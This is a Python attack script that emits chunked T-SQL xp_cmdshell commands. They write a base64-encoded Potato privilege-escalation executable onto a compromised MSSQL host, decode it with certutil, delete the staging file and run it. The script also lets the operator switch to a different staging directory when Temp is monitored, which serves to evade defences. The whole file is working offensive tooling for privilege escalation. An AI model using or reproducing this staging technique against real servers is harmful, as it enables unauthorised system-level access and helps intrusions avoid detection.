#!/usr/bin/env python3
"""Emit chunked xp_cmdshell lines that stage a Potato exe onto a target with NO network fetch.

Usage: python3 stage_b64.py GodPotato-NET4.exe [remote_name.exe] [chunk_chars]
Run each emitted `EXEC master..xp_cmdshell '...'` line in order in your SQL shell, then the decode line,
then run the exe. base64 has no quotes/specials, so no T-SQL escaping is needed for the chunks.
"""
import base64
import sys
import _winpriv_common as P

_a = sys.argv[1:]
_stage = (_a[_a.index("--stagedir") + 1] if "--stagedir" in _a else P.STAGE).rstrip("\\")   # noexec/monitored Temp? override
# positional args (skip --stagedir and its value): src, [remote], [chunk]
_pos = [a for i, a in enumerate(_a) if not a.startswith("--") and (i == 0 or _a[i-1] != "--stagedir")]
if not _pos:
    sys.exit("usage: python3 stage_b64.py <TOOL>.exe [remote_name.exe] [chunk_chars] [--stagedir DIR]\n"
             "  <TOOL>.exe = a Potato exe YOU supply (see ../SUPPLIED-BINARIES.md).")
src = _pos[0]
remote = _pos[1] if len(_pos) > 1 else "g.exe"
chunk = int(_pos[2]) if len(_pos) > 2 else 6000     # < 8191 cmd-line limit, headroom for the wrapper

b64 = base64.b64encode(P.read_tool(src)).decode()
tmp_b64 = f"{_stage}\\{remote}.b64"
tmp_exe = f"{_stage}\\{remote}"

print(f"-- staging {src} ({len(b64)} b64 chars) -> {tmp_exe} in {(len(b64)+chunk-1)//chunk} chunk(s)")
# first chunk uses > (create/overwrite), the rest use >> (append)
for i in range(0, len(b64), chunk):
    op = ">" if i == 0 else ">>"
    print(f"EXEC master..xp_cmdshell 'echo {b64[i:i+chunk]}{op}{tmp_b64}';")
print(f"EXEC master..xp_cmdshell 'certutil -decode {tmp_b64} {tmp_exe}';")
print(f"EXEC master..xp_cmdshell 'del {tmp_b64}';")
print(f"-- then run it, e.g.:  EXEC master..xp_cmdshell '{tmp_exe} -cmd \"cmd /c whoami\"';")
